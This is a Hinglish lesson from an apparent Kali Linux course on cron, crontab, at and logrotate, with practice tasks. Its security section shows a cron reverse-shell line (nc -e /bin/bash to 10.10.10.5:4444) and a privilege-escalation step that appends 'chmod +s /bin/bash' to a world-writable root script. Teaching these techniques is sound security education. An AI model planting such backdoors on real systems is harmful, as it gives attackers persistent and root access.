---
title: "Topic 50 - Linux System Maintenance & Task Automation (cron, crontab, at, logrotate)"
tags:
  - kali-linux
  - cybersecurity
  - learning-session
type: course-topic
---

← [[Course on Kali Linux|Go Back to Course Hub]]

# 🤖 Topic 50: Linux System Maintenance & Task Automation (cron, crontab, at, logrotate)

Bhai, Linux Administration aur Cybersecurity dono me **Task Automation** ka bohot bada role hai. Routine tasks ko manual karne ke bajaye (jaise system updates, log cleanup, automated backups, ya scheduled security scanning), hum system ko automate kar dete hain.

Cybersecurity me:
* **Defenders (Blue Team):** Automated log rotation (`logrotate`) aur scheduled backups set karte hain.
* **Attackers (Red Team):** System reboot hone ke baad bhi apna access maintain rakhne ke liye **Cron Persistence** set karte hain, ya misconfigured writable cron jobs ko identify karke **Root Privilege Escalation** karte hain!

---

### ⏰ 1. `cron` & `crontab` (Recurring Task Scheduler)

`cron` Linux ka default background daemon hai jo user-defined schedules par commands/scripts ko automatic execute karta hai.

#### A. Crontab Syntax (The 5 Stars Magic 🌟)
`crontab -e` chalaane par ek text file khulati hai jisme har line ka format aisa hota hai:

```text
┌───────────── Minute (0 - 59)
│ ┌─────────── Hour (0 - 23)
│ │ ┌───────── Day of Month (1 - 31)
│ │ │ ┌─────── Month (1 - 12)
│ │ │ │ ┌───── Day of Week (0 - 6, 0=Sunday)
│ │ │ │ │
* * * * * /path/to/command_or_script.sh
```

#### Common Examples:
* **Har minute chalane ke liye:** `* * * * * /bin/bash /home/user/script.sh`
* **Daily raat ko 2 baje:** `0 2 * * * /usr/bin/apt update`
* **Har Sunday raat 12 baje:** `0 0 * * 0 /home/kali/backup.sh`
* **Har 15 minute me:** `*/15 * * * * /home/kali/check_status.sh`

#### Crontab Commands:
* **`crontab -e`**: Current user ka crontab edit karna.
* **`crontab -l`**: Active scheduled cron jobs list dekhna.
* **`crontab -r`**: Saare user cron jobs delete karna.
* **`sudo crontab -u root -e`**: Root user ke liye cron job set karna.

---

### 🎯 2. `at` Command (One-Time Future Task Scheduler)

Agar aapko koi task sirf **ek baar** specific time par chalana hai (baart-baar nahi):
```bash
echo "bash /home/kali/report.sh" | at 16:30
```
Ya:
```bash
at now + 10 minutes
at> python3 scan.py
at> <Press Ctrl + D to Save>
```
* Active `at` jobs dekhne ke liye: `atq`
* Scheduled job remove karne ke liye: `atrm <job_id>`

---

### 🛡️ 3. `logrotate` (Preventing Disk Space Exhaustion)

Web servers aur system logs (`/var/log/`) time ke sath GBs me grow kar sakte hain jisse disk full hone ka khatra hota hai.
* **`logrotate`** old log files ko compress (`.gz`), archive aur automatically delete kar deta hai.
* System config file: `/etc/logrotate.conf` aur `/etc/logrotate.d/`.

---

### 💀 4. Cybersecurity Perspective (Persistence & PrivEsc)

#### A. Attacker Persistence (Backdoor Cron Job)
Hackers persistent reverse shell cron me add kar dete hain taaki har 5 minute me unhe target machine se access mil sake:
```text
*/5 * * * * nc -e /bin/bash 10.10.10.5 4444 >/dev/null 2>&1
```

#### B. Cron Privilege Escalation Vector
Root user `/etc/crontab` me koi script chala raha hai aur us script par normal user ko Write permission (`chmod 777`) di hui hai:
```bash
ls -la /opt/backup.sh
# Output: -rwxrwxrwx 1 root root /opt/backup.sh
```
* **Attack:** Hacker us `backup.sh` me malicious code append kar deta hai (`echo "chmod +s /bin/bash" >> /opt/backup.sh`). Jab root ka cron chalega, hacker ko instantaneous root access mil jaayega!

---

### 🔑 Real-World Analogy (The Alarm Clock & Butler ⏰🧹)
* **`cron` (The Daily Alarm Clock):** Jaise aapne apne phone par alarm set kar diya ki "Har Subah 6:00 AM par paani ka pump chalao". Wo daily bina aapke bole automatic chalta rahega.
* **`at` (The One-Time Reminder):** Jaise aapne reminder lagaya: "Aaj shaam 4:30 PM par doctor se दवाई lene jana hai". Task khatam hote hi reminder automatically discard ho gaya.
* **`logrotate` (The Trash Compactor):** Jaise office ka sweeper har weekend purani raddi newspapers ko compress karke raddi-tokri me daalta hai taaki office space bhar na jaye.

---

### 📝 10 Practice Questions/Tasks for You!

Bhai, Task Automation mechanics check karne ke liye in tasks ko terminal par execute karein:

1. **Task 1:** Apne current user ki active cron jobs list dekhne ke liye **`crontab -l`** run karein.
2. **Task 2:** System-wide cron configuration file inspect karne ke liye command run karein: **`cat /etc/crontab`**.
3. **Task 3:** Systematic cron directories inspect karne ke liye `ls -la /etc/cron.*` (hourly, daily, weekly, monthly folders) verify karein.
4. **Task 4:** Ek test cron job edit modal kholne ke liye **`crontab -e`** run karein (Select editor like nano if prompted).
5. **Task 5:** `crontab -e` me ye test line add karein jo har minute `/tmp/cron_test.txt` me timestamp likhe:
   ```text
   * * * * * date >> /tmp/cron_test.txt
   ```
6. **Task 6:** Save karne ke baad 1-2 minute wait karein aur check karein `cat /tmp/cron_test.txt` me date entries append ho rahi hain ya nahi.
7. **Task 7:** Test complete hone par `crontab -e` me se us line ko delete karke save karein ya **`crontab -r`** se clean karein.
8. **Task 8:** `logrotate` configuration settings check karne ke liye `/etc/logrotate.conf` read karein: `cat /etc/logrotate.conf`.
9. **Task 9:** Future single-execution `at` command test karein (agar `at` service installed ho): `echo "echo 'Hello' > /tmp/at_test.txt" | at now + 1 minute`.
10. **Task 10:** Red Team assessment me `/etc/crontab` aur `/var/spool/cron/crontabs/` audit karke misconfigured script permissions se Privilege Escalation dhundhne ka kya logic hota hai? 2 lines me explain karein.

---
